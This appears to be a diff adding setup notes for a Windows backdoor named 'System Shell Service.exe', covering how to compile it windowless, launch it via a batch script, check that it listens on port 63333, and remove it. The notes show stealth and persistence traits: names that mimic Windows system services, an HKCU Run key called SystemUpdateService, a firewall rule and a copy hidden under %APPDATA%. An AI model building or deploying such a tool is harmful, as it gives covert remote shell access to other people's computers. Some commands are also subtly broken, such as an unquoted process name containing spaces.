@@ -1,0 +1,26 @@
+1. have g++ installed. run below:
+windres "version.rc" -O coff -o version.res
+g++ -mwindows -O2 -static "Windows System Shell Service.cpp" version.res -lws2_32 -liphlpapi -o "System Shell Service.exe"
+
+
+2. have the binary "System Shell Service.exe" and the bat script "Windows System Shell Service.bat" in the same
+directory such as desktop:
+
+
+3. run the bat script as admin or maybe reguler user.
+
+
+4. confirm its running:
+netstat -an | find "63333"
+tasklist | find "System Shell Service.exe"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdateService
+
+
+5.Uninstall:
+@echo off
+taskkill /f /im System Shell Service.exe >nul 2>&1
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdateService /f >nul 2>&1
+netsh advfirewall firewall delete rule name="System Network Service" >nul 2>&1
+del "%APPDATA%\Microsoft\System\System Shell Service.exe" >nul 2>&1
+echo [SUCCESS] Uninstalled.
+pause
